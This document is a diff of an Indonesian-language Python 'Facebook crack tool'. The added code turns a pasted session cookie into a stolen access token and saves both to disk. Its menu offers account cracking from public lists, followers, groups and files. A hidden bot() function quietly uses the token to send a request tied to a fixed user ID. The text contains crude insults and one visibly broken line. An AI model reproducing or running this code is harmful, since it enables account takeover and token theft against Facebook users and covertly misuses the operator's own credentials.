@@ -782,28 +782,17 @@ def clear():
 def back():
 	login()
 # BANNER
+def ba#------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
-	clear()
-	wel='# WELCOME TO FACEBOOK CRACK TOOL'
-	cik2=mark(wel ,style='cyan')
-	sol().print(cik2)
-	ban='''
-CRACK FB'''
- #VALIDASI TOKEN
-def login123():
-	os.system('clear')
-	banner()
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Login Menggunakan Cookie [[bold green] ON [bold white]][/]\n[bold white][bold white][[bold green]00[/][bold white]][/] [bold red]Keluar Dari Script [[bold green] ON [bold white]][/]',width=90,title=f"[bold green]Pilihan Login",style=f"bold white"))
-	bryn = input(f' ╰─  Pilih Menu : ')
-	if bryn in ['1','01']:
-		login_menu()
-	elif bryn in ['0','00']:
-		exit()
-	else:
-		print(' ╰─  Pilih Yang Bener Asu ')
-		time.sleep(5)
-		back()
-		
+	print(f'''\t{asu} 
+ _______________________________________________________________
+     _     _     __     _      _____    ____    _  _  _  _  _  _
+    /|   /    /    )   /      /    '   /    )  | /   | /   | / 
+---/-| -/----/----/---/------/__------/____/---|-----|-----|---
+  /  | /    /    /   /      /        /        /|    /|    /|   
+_/___|/____(____/___/____/_/____ ___/________/_|___/_|___/_|___
+			{m}•{k}•{h}•{sir} Author : NOLEPXXX{x}{m}•{k}•{h}•{x}''')
+#--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
 		token = open('.token.txt','r').read()
@@ -815,110 +804,84 @@ def login():
 			sy3 = json.loads(sy.text)['id']
 			menu(sy2,sy3)
 		except KeyError:
-			login123()
+			login_lagi334()
 		except requests.exceptions.ConnectionError:
-			li = ' ╰─  Problem Internet Connection, Check And Try Again'
+			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
 			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
 	except IOError:
-		login123()
-		
-def login_menu():
+		login_lagi334()
+def login_lagi334():
 	try:
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
-		your_cookies = input(' ╰─  Masukan Cookie : ')
-		with requests.Session() as r:
-			try:
-				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
-				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
-				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
-				code, user_code = response['code'], response['user_code']
-				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
-				r.headers.pop('content-type')
-				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
-				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
-				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
-				else:
-					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
-					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
-					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
-					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
-					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
-					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
-					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
-						r.headers.pop('content-type');r.headers.pop('origin')
-						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
-						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
-						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
-						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
-						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
-						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
-						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
-						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
-						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
-						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
-						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
-						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
-						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
-						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
-						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
-						r.headers.pop('content-type');r.headers.pop('origin')
-						r.headers.update({'referer': 'https://m.facebook.com/',})
-						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
-						if 'Sukses!' in str(response6):
-							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
-							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
-							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							print(f"\n ╰─  Token : {access_token}")
-							tokenew = open(".token.txt","w").write(access_token)
-							cook= open(".cok.txt","w").write(your_cookies)
-							print("\n ╰─  Login Berhasil | python sun.py");exit()
-			except Exception as e:
-				print(" ╰─  Cookies Mokad Kontol")
-				os.system('rm -rf .token.txt && rm -rf .cok.txt')
-				print(e)
-				time.sleep(3)
-				back()
-	except:pass 
+		os.system('clear')
+		banner()
+		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
+		asu = random.choice([m,k,h,b,u])
+		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+		find_token = re.search("(EAAG\w+)", data.text)
+		ken=open(".token.txt", "w").write(find_token.group(1));bot()
+		cok=open(".cok.txt", "w").write(cookie)
+		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
+		exit()
+	except Exception as e:
+		os.system("rm -f .token.txt")
+		os.system("rm -f .cok.txt")
+		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
+		exit()
+def bot():
+	try:
+		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
+	except:
+		pass
+#------------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		print(' [+] Cookies Kadaluarsa ')
+		print('[×] Cookies Kadaluarsa ')
 		time.sleep(5)
-		login()
+		login_lagi334()
 	os.system('clear')
 	banner()
-	negara = requests.get("http://ip-api.com/json/").json()["country"]
-	ip = requests.get("http://ip-api.com/json/").json()["query"]
-	dic.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{day}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 3.3[/][/] ',width=43,padding=(0,3),style=f"bold cyan"))
-	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{asal_kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{asal_reg}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold cyan"))
-	console.print(Columns(dia))
-	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Rochmat Basuki , Nazri XD , Aorec XD , Lukman-XD , Dapunta , Kall",width=90,title=f"[bold green]Thanks To",style=f"bold cyan"))
-	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack From Friends     [bold white][[bold cyan]06[bold white]] Crack From Username[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack From Massal      [bold white][[bold cyan]07[bold white]] Crack From Followers     [[bold cyan]12[bold white]] Spam WhatsApp      \n[bold white][[bold cyan]03[bold white]] Crack From Groups      [[bold cyan]08[bold white]] Crack From Comment       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack From Email       [bold white][[bold cyan]09[bold white]] Check Opsi Checkpoint [bold white]   [[bold cyan]14[bold white]] Dump Id \n[bold white][[bold cyan]05[bold white]] Crack From Files       [bold white][[bold cyan]10[bold white]] [bold white]Check Result Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold cyan"))
-	cetak(panel(f"Jika Ingin Masuk Ke Menu Crack Instagram Ketik[bold green] Instagram[bold white] Untuk Masuk Ke Menu Instagram",width=90,style=f"bold cyan"))
-	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
-	if _____brayennn___xd____ in ['1','01']:
-		brayen_dump()
-	elif _____brayennn___xd____ in ['2','02']:
+	ip = requests.get("https://api.ipify.org").text
+	gh = 'github.com/Al-Vino'
+	cetak(nel('\tSelamat Datang [yellow]%s[white] Ngentod'%(my_name)))
+	print(f'>> Your Idz : '+str(my_id))
+	print(f'>> Your Ip  : {ip}')
+	print(f'>> Github   : {gh}')
+	print('')
+	print('>> 1. Crack Publik ')
+	print('>> 2. Crack Follower ')
+	print('>> 3. Crack Grup   ')
+	print('>> 4. Crack File	')
+	print('>> 5. Hasil Crack  ')
+	print('>> 0. Keluar       ')
+	_____alvino__adijaya_____ = input('\n>> Pilih : ')
+	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
-	elif _____brayennn___xd____ in ['3','03']:
+	elif _____alvino__adijaya_____ in ['2']:
+		dump_follower()
+	elif _____alvino__adijaya_____ in ['3']:
+		grup()
+	elif _____alvino__adijaya_____ in ['4']:
+		crack_file()
+	elif _____alvino__adijaya_____ in ['5']:
 		result()
-	elif _____brayennn___xd____ in ['4','04']:
-		file()
-	
-	elif _____brayennn___xd____ in ['5','05']:
+	elif _____alvino__adijaya_____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print(f' [+] {m}Sukses Logout+Hapus Cookies')
-		time.sleep(5)
-		login()
-	else:
-		print(' [+] Pilih Yang Bener Asu ')
+		print('>> Sukses Logout+Hapus Kukis ')
 		exit()
+	else:
+		print('>> Pilih Yang Bener Asu ')
+		back()
+def error():
+	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
+	time.sleep(4)
+	back()
 
 def result():
 	cek = '# CEK RESULT CRACK'
